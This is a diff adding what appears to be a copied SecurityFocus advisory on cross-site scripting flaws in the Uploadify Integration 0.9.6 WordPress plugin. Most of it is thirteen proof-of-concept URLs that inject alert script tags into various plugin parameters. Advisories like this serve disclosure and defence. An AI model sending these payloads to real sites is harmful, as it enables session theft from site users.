@@ -1,0 +1,46 @@
+source: http://www.securityfocus.com/bid/52944/info
+
+Uploadify Integration plugin for WordPress is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Uploadify Integration 0.9.6 is vulnerable; other prior versions may also be affected. 
+
+http://www.example.com/wp331/wp-content/plugins/uploadify-integration/views/scripts/
+shortcode/index.php?inputname="><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://www.example.com/wp331/wp-content/plugins/uploadify-integration/views/scripts/
+shortcode/index.php?buttontext="><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://www.example.com/wp331/wp-content/plugins/uploadify-integration/views/scripts/
+shortcode/index.php?filetypeexts="><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://www.example.com/wp331/wp-content/plugins/uploadify-integration/views/scripts/
+shortcode/index.php?filetypedesc="><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://www.example.com/wp331/wp-content/plugins/uploadify-integration/views/scripts/
+shortcode/index.php?filesizelimit="><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://www.example.com/wp331/wp-content/plugins/uploadify-integration/views/scripts/
+shortcode/index.php?uploadmode="><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://www.example.com/wp331/wp-content/plugins/uploadify-integration/views/scripts/
+shortcode/index.php?metatype="><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://www.example.com/wp331/wp-content/plugins/uploadify-integration/views/scripts/
+shortcode/index.php?parentid="><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://www.example.com/wp331/wp-content/plugins/uploadify-integration/views/scripts/
+shortcode/index.php?path="><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://www.example.com/wp331/wp-content/plugins/uploadify-integration/views/scripts/
+shortcode/index.php?url="><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://www.example.com/wp331/wp-content/plugins/uploadify-integration/views/scripts/
+partials/file.php?fileid="><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://www.example.com/wp331/wp-content/plugins/uploadify-integration/views/scripts/
+partials/file.php?inputname="><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://www.example.com/wp331/wp-content/plugins/uploadify-integration/views/scripts/
+file/error.php?error="><script>alert(String.fromCharCode(88,83,83))</script>
